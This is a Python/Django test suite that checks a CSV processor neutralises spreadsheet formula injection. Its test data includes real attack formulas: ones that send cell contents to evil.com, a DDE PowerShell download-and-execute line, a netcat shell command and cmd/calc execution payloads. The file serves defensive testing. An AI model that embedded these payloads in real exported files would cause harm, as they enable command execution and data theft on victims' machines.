"""
Security Tests for CSV Injection Prevention.

These tests verify that the CSV processor correctly sanitizes cell values
to prevent formula injection attacks (CSV Injection / CWE-1236).

References:
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- CWE-1236: Improper Neutralization of Formula Elements in a CSV File
"""

import os
import tempfile
import pandas as pd
from django.test import TestCase
from apps.reports.services.csv_processor import AzureAdvisorCSVProcessor, CSVProcessingError


class CSVInjectionSecurityTestCase(TestCase):
    """
    Test suite for CSV Injection prevention.

    CSV Injection (also known as Formula Injection) occurs when spreadsheet
    applications like Excel, LibreOffice Calc, or Google Sheets execute
    formulas present in CSV files. Malicious formulas can:
    - Execute arbitrary commands (=cmd|'/c calc')
    - Exfiltrate data (=IMPORTXML(CONCAT("http://evil.com/",A1)))
    - Perform DDE attacks
    """

    def setUp(self):
        """Create temporary directory for test CSV files."""
        self.test_dir = tempfile.mkdtemp()

    def tearDown(self):
        """Clean up temporary test files."""
        import shutil
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir)

    def create_test_csv(self, filename: str, data: dict) -> str:
        """
        Helper method to create a test CSV file.

        Args:
            filename: Name of the CSV file
            data: Dictionary with column names as keys and lists of values

        Returns:
            str: Path to the created CSV file
        """
        filepath = os.path.join(self.test_dir, filename)
        df = pd.DataFrame(data)
        df.to_csv(filepath, index=False)
        return filepath

    def test_sanitize_formula_starting_with_equals(self):
        """Test sanitization of formulas starting with = (most common)."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '=1+1',
            '=SUM(A1:A10)',
            '=cmd|"/c calc"!A1',
            '=HYPERLINK("http://evil.com","Click")',
            '=IMPORTXML(CONCAT("http://evil.com/",A1),"//a")',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")
                self.assertEqual(sanitized, "'" + value,
                               f"Incorrect sanitization for: {value}")

    def test_sanitize_formula_starting_with_plus(self):
        """Test sanitization of formulas starting with +."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '+1+1',
            '+2+3+cmd|"/c calc"!A1',
            '+SUM(A1:A10)',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")

    def test_sanitize_formula_starting_with_minus(self):
        """Test sanitization of formulas starting with -."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '-1',
            '-2-3-cmd|"/c calc"!A1',
            '-SUM(A1:A10)',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")

    def test_sanitize_formula_starting_with_at(self):
        """Test sanitization of formulas starting with @ (Excel 365 implicit intersection)."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '@SUM(A1:A10)',
            '@A1',
            '@cmd|"/c calc"!A1',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")

    def test_sanitize_formula_starting_with_pipe(self):
        """Test sanitization of formulas starting with | (pipe commands)."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '|calc',
            '|cmd /c calc',
            '|powershell -Command "Start-Process calc"',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")

    def test_sanitize_formula_with_tab_or_cr(self):
        """Test sanitization of formulas starting with tab or carriage return."""
        processor = AzureAdvisorCSVProcessor('')

        malicious_values = [
            '\t=1+1',
            '\r=cmd|"/c calc"!A1',
        ]

        for value in malicious_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to sanitize: {value}")

    def test_safe_values_not_modified(self):
        """Test that safe values are not modified."""
        processor = AzureAdvisorCSVProcessor('')

        safe_values = [
            'Normal text',
            'Text with numbers 123',
            'Text with (parentheses)',
            'Text with "quotes"',
            '123',
            'https://example.com',
            'user@example.com',
            '',  # Empty string
            'Text ending with =',
            'Text with = in middle',
        ]

        for value in safe_values:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertEqual(sanitized, value.strip(),
                               f"Safe value was modified: {value}")

    def test_whitespace_handled_correctly(self):
        """Test that leading/trailing whitespace is handled correctly."""
        processor = AzureAdvisorCSVProcessor('')

        # Values with leading whitespace and dangerous characters
        test_cases = [
            ('  =1+1', "'=1+1"),  # Leading spaces removed, then sanitized
            ('\t\t+2+2', "'+2+2"),  # Tab/whitespace removed, then sanitized
            ('   Normal text', 'Normal text'),  # Just trimmed
        ]

        for input_val, expected in test_cases:
            with self.subTest(input=input_val):
                sanitized = processor.sanitize_cell_value(input_val)
                self.assertEqual(sanitized, expected,
                               f"Whitespace handling failed for: {input_val}")

    def test_non_string_values_unchanged(self):
        """Test that non-string values are returned unchanged."""
        processor = AzureAdvisorCSVProcessor('')

        non_string_values = [
            123,
            45.67,
            None,
            True,
            False,
        ]

        for value in non_string_values:
            with self.subTest(value=value):
                result = processor.sanitize_cell_value(value)
                self.assertEqual(result, value,
                               f"Non-string value was modified: {value}")

    def test_csv_processing_sanitizes_all_columns(self):
        """
        Integration test: Verify that CSV processing sanitizes all text columns.
        """
        # Create CSV with malicious formulas
        data = {
            'Category': ['Cost', '=SUM(A1:A10)', 'Security'],
            'Recommendation': [
                'Normal recommendation',
                '=cmd|"/c calc"!A1',
                '+IMPORTXML("http://evil.com")'
            ],
            'Business Impact': ['High', '@A1', 'Medium'],
            'Resource Name': ['vm-001', '|calc', 'storage-002'],
        }

        filepath = self.create_test_csv('malicious.csv', data)

        # Process CSV
        processor = AzureAdvisorCSVProcessor(filepath)
        recommendations, statistics = processor.process()

        # Verify all dangerous values were sanitized
        self.assertEqual(len(recommendations), 3, "Should process all rows")

        # Check that dangerous values start with single quote
        for rec in recommendations:
            for key, value in rec.items():
                if isinstance(value, str) and value:
                    # If original value started with dangerous char, should now start with '
                    self.assertFalse(
                        any(value.startswith(prefix) for prefix in
                            AzureAdvisorCSVProcessor.FORMULA_PREFIXES),
                        f"Dangerous value not sanitized: {value}"
                    )

    def test_real_world_attack_vectors(self):
        """
        Test real-world CSV injection attack vectors from OWASP.
        """
        processor = AzureAdvisorCSVProcessor('')

        # Real attack vectors from OWASP and security research
        attack_vectors = [
            # Command execution (Windows)
            '=cmd|"/c calc"!A1',
            '=cmd|"/c powershell IEX(wget bit.ly/malware)"!A1',

            # Command execution (Mac/Linux)
            '=cmd|"/c nc -lvvp 4444 -e /bin/sh"!A1',

            # Data exfiltration
            '=IMPORTXML(CONCAT("http://evil.com/",A1),"//a")',
            '=HYPERLINK("http://evil.com?data="&A1,"Click me")',

            # DDE (Dynamic Data Exchange) attacks
            '@SUM(1+1)*cmd|"/c calc"!A1',
            '+2+3+cmd|"/c calc"!A1',
            '-2-3-cmd|"/c calc"!A1',

            # Encoded attacks
            '=CHAR(67)&CHAR(65)&CHAR(76)&CHAR(67)',  # CALC in char codes
        ]

        for attack in attack_vectors:
            with self.subTest(attack=attack):
                sanitized = processor.sanitize_cell_value(attack)
                self.assertTrue(sanitized.startswith("'"),
                               f"Failed to block attack: {attack}")
                self.assertNotEqual(sanitized, attack,
                                  f"Attack vector not modified: {attack}")

    def test_csv_export_maintains_sanitization(self):
        """
        Test that when CSV is processed and re-exported, sanitization is maintained.
        """
        # Create CSV with malicious content
        data = {
            'Category': ['Cost', 'Security'],
            'Recommendation': ['=cmd|"/c calc"!A1', 'Normal text'],
        }

        input_path = self.create_test_csv('malicious_input.csv', data)
        output_path = os.path.join(self.test_dir, 'sanitized_output.csv')

        # Process and get DataFrame
        processor = AzureAdvisorCSVProcessor(input_path)
        processor.validate_file()
        processor.read_csv()
        processor.validate_structure()
        processor.normalize_column_names()
        processor.clean_data()  # This applies sanitization

        # Export to new CSV
        processor.df.to_csv(output_path, index=False)

        # Read the exported CSV and verify sanitization persists
        df_output = pd.read_csv(output_path)

        # Check that dangerous values are still sanitized
        for col in df_output.select_dtypes(include=['object']).columns:
            for value in df_output[col].dropna():
                if value and isinstance(value, str):
                    self.assertFalse(
                        any(value.startswith(prefix) for prefix in
                            AzureAdvisorCSVProcessor.FORMULA_PREFIXES),
                        f"Sanitization lost after export: {value}"
                    )

    def test_performance_with_large_dataset(self):
        """
        Test that sanitization doesn't significantly impact performance.
        """
        import time

        # Create large CSV with mix of safe and dangerous values
        rows = 1000
        data = {
            'Category': ['Cost'] * rows,
            'Recommendation': ['Normal text'] * (rows // 2) + ['=SUM(A1:A10)'] * (rows // 2),
            'Business Impact': ['High'] * rows,
        }

        filepath = self.create_test_csv('large_dataset.csv', data)

        # Time the processing
        processor = AzureAdvisorCSVProcessor(filepath)
        start_time = time.time()
        recommendations, statistics = processor.process()
        elapsed_time = time.time() - start_time

        # Should process 1000 rows in reasonable time (< 5 seconds)
        self.assertLess(elapsed_time, 5.0,
                       f"Sanitization too slow: {elapsed_time:.2f}s for {rows} rows")
        self.assertEqual(len(recommendations), rows,
                        "Should process all rows")

    def test_unicode_and_special_characters(self):
        """
        Test that unicode and special characters are handled correctly.
        """
        processor = AzureAdvisorCSVProcessor('')

        # Safe unicode values should not be modified
        safe_unicode = [
            'Costo estimado: $1,000',
            'Recomendación en español',
            '日本語のテキスト',
            'Ελληνικά',
            'Emoji test 😀 🔐',
        ]

        for value in safe_unicode:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertEqual(sanitized, value,
                               f"Unicode value incorrectly modified: {value}")

        # Dangerous unicode should be sanitized
        dangerous_unicode = [
            '=Σ(A1:A10)',  # Greek Sigma but starts with =
            '+数式',  # Japanese but starts with +
        ]

        for value in dangerous_unicode:
            with self.subTest(value=value):
                sanitized = processor.sanitize_cell_value(value)
                self.assertTrue(sanitized.startswith("'"),
                               f"Dangerous unicode not sanitized: {value}")


class CSVInjectionDocumentationTestCase(TestCase):
    """
    Test that appropriate warnings are logged for security events.
    """

    def test_sanitization_is_logged(self):
        """Verify that CSV injection prevention is logged for audit purposes."""
        import logging
        from io import StringIO

        # Capture logs
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('apps.reports.services.csv_processor')
        original_level = logger.level
        logger.setLevel(logging.DEBUG)
        logger.addHandler(handler)

        try:
            processor = AzureAdvisorCSVProcessor('')
            processor.sanitize_cell_value('=cmd|"/c calc"!A1')

            # Check logs contain security event
            log_content = log_stream.getvalue()
            self.assertIn('CSV Injection prevented', log_content,
                         "Security event not logged")

        finally:
            logger.removeHandler(handler)
            logger.setLevel(original_level)
